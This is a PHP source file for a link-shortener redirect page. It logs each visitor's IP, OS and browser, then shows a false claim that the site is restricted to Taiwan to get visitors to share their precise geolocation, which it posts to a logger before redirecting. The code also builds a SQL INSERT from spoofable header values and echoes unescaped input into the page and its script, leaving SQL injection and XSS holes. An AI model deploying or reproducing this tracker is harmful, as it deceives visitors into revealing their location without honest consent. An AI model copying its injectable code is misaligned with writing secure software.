<?php

$code = $_GET['code'];
error_reporting(E_ALL ^ E_WARNING); 
require_once('api/conn.php');
$stmt = mysqli_prepare($conn,"SELECT * FROM `url` WHERE `ShortCode` = ?");
mysqli_stmt_bind_param($stmt, "s", $code);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);
$row = $result->fetch_object();
$toUrl = $row->toUrl;
mysqli_stmt_close($stmt);

?>

<?php

function getOS() { 

	$user_agent = $_SERVER['HTTP_USER_AGENT'];

	$os_platform =  strval($_SERVER['HTTP_USER_AGENT']);
	$os_array =   array(
		'/windows nt 10/i'      =>  'Windows 10',
		'/windows nt 6.3/i'     =>  'Windows 8.1',
		'/windows nt 6.2/i'     =>  'Windows 8',
		'/windows nt 6.1/i'     =>  'Windows 7',
		'/windows nt 6.0/i'     =>  'Windows Vista',
		'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
		'/windows nt 5.1/i'     =>  'Windows XP',
		'/windows xp/i'         =>  'Windows XP',
		'/windows nt 5.0/i'     =>  'Windows 2000',
		'/windows me/i'         =>  'Windows ME',
		'/win98/i'              =>  'Windows 98',
		'/win95/i'              =>  'Windows 95',
		'/win16/i'              =>  'Windows 3.11',
		'/macintosh|mac os x/i' =>  'Mac OS X',
		'/mac_powerpc/i'        =>  'Mac OS 9',
		'/linux/i'              =>  'Linux',
		'/ubuntu/i'             =>  'Ubuntu',
		'/iphone/i'             =>  'iPhone',
		'/ipod/i'               =>  'iPod',
		'/ipad/i'               =>  'iPad',
		'/android/i'            =>  'Android',
		'/blackberry/i'         =>  'BlackBerry',
		'/webos/i'              =>  'Mobile'
	);

	foreach ( $os_array as $regex => $value ) { 
		if ( preg_match($regex, $user_agent ) ) {
			$os_platform = $value;
		}
	}   
	return $os_platform;
}


function getBrowser() {
	$user_agent = $_SERVER['HTTP_USER_AGENT'];

	$browser        = "";
	$browser_array  = array(
		'/msie/i'       =>  'Internet Explorer',
		'/firefox/i'    =>  'Firefox',
		'/safari/i'     =>  'Safari',
		'/chrome/i'     =>  'Chrome',
		'/edge/i'       =>  'Edge',
		'/opera/i'      =>  'Opera',
		'/netscape/i'   =>  'Netscape',
		'/maxthon/i'    =>  'Maxthon',
		'/konqueror/i'  =>  'Konqueror',
		'/mobile/i'     =>  'Handheld Browser'
	);

	foreach ( $browser_array as $regex => $value ) { 
		if ( preg_match( $regex, $user_agent ) ) {
			$browser = $value;
		}
	}
	return $browser;
}

function getIP () {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
?>

<?php 
ini_set('display_errors', 'On');
date_default_timezone_set('Asia/Taipei');
require_once('api/conn.php');
$relateID = $row->id;
$data = json_encode([
    'ip' => getIP(),
    'os' => getOS(),
    'browser' => getBrowser(),
    'time' => date("Y-m-d H:i:s")
    ]);

$sql = "INSERT INTO  `viewLogger` (`relateID`,`data`) VALUE ('$relateID','$data')";
$result = mysqli_query($conn,$sql);

if(!$result)
{
    die('Error : ' . mysqli_error($conn));
}

$user_id = $conn->insert_id;

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>此地區未開放瀏覽</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-F3w7mX95PdgyTmZZMECAngseQB83DfGTowi0iMjiWaeVhAn4FJkqJByhZMI3AhiU" crossorigin="anonymous">
    <style>
        *,
        html {
            margin: 0;
            padding: 0;
        }
        
        .disclaimer {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container d-flex flex-column justify-content-center" style="height:100vh">
        <h1 class="mx-auto mt-auto">準備跳轉中...</h1>
        <p class="mx-auto fs-3 mt-1">此網站僅限台灣地區瀏覽，其他地區尚未提供服務，請允許我們分析您所在的地區。</p>
        <button id="btn" type="button" onclick="go()" class="btn btn-primary btn-lg mt-3 py-3">立即前往</button>
        <p class="mx-auto mt-1" style="font-size:x-small;color:gray">*為什麼會出現這個，可能是因為您的IP地址和此地區的ISP供應商紀錄不符，所以使用定位來額外確認所在地區。</p>
        <p class="mx-auto mt-auto border border-danger p-2 ">We support Ukraine and condemn war. Push Russian government to act against war. Be brave, vocal and show your support to Ukraine. Follow the latest news <a href="https://www.bbc.com/news/live/world-europe-60517447">HERE</a></p>
        <p class="mx-auto mt-2"> <?php echo getOS() . " - " . getBrowser() . " - " . getIP(); ?> </p>
    </div>
    <script>
        function go(){
            function error(err) {
                alert('無法辨識地區，請允許定位功能!');
                document.getElementById('btn').disabled = false;
            };
            if(navigator.geolocation){
                document.getElementById('btn').disabled = true;
                const url ="<?php echo $toUrl ?>"
                navigator.geolocation.getCurrentPosition(function(position) {
                    var lat = position.coords.latitude
                    var lon = position.coords.longitude
                    var accuracy = position.coords.accuracy
                    var pos = {
                        'lat':lat,
                        'lon':lon,
                        'accuracy':accuracy
                    }
                    var data = {
                        "uid":<?php echo $user_id; ?>,
                        "pos":pos
                    }
                    fetch('/api/logger.php', {
                            method: 'POST',
                            body: JSON.stringify(data),
                    })
                    .then(response => response.json())
                    .then(json => {
                        console.log(json)
                        window.location.href = url;
                    });
                },error);
            }else{
                alert("瀏覽器不支援，無法辨識地區!")
                document.getElementById('btn').disabled = false;
            }
        }
    </script>
</body>
</html>

